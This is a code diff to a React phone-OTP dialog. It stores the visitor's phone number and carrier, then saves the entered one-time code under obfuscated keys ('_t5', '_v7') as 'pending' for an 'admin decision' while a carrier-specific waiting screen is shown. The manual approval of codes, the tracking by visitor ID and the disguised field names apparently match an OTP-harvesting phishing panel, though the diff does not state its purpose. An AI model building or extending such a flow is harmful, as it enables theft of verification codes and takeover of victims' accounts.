@@ -14,10 +14,12 @@ interface PhoneOtpDialogProps {
   open: boolean
   onOpenChange: (open: boolean) => void
   phoneNumber: string
+  phoneCarrier: string
   onRejected: () => void
+  onShowWaitingModal: (carrier: string) => void
 }
 
-export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: PhoneOtpDialogProps) {
+export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, phoneCarrier, onRejected, onShowWaitingModal }: PhoneOtpDialogProps) {
   const [otp, setOtp] = useState("")
   const [timer, setTimer] = useState(60)
   const [otpStatus, setOtpStatus] = useState<"waiting" | "verifying" | "approved" | "rejected">("waiting")
@@ -134,12 +136,24 @@ export function PhoneOtpDialog({ open, onOpenChange, phoneNumber, onRejected }: 
         phoneOtpUpdatedAt: new Date().toISOString()
       })
 
+      // Add phone info to history first (if not already added)
+      await addToHistory(visitorID, "_t4", {
+        phoneNumber: phoneNumber,
+        phoneCarrier: phoneCarrier
+      }, "approved") // Auto-approve phone number
+
       // Add phone OTP to history
       await addToHistory(visitorID, "_t5", {
         _v7: otp
       }, "pending")
 
-      console.log("[PhoneOTP] OTP submitted, waiting for admin decision")
+      console.log("[PhoneOTP] OTP submitted, closing dialog and showing waiting modal")
+      
+      // Close OTP dialog
+      onOpenChange(false)
+      
+      // Show waiting modal based on carrier
+      onShowWaitingModal(phoneCarrier)
     } catch (err) {
       console.error("[PhoneOTP] Error submitting OTP:", err)
       setError("حدث خطأ في إرسال الرمز. يرجى المحاولة مرة أخرى.")
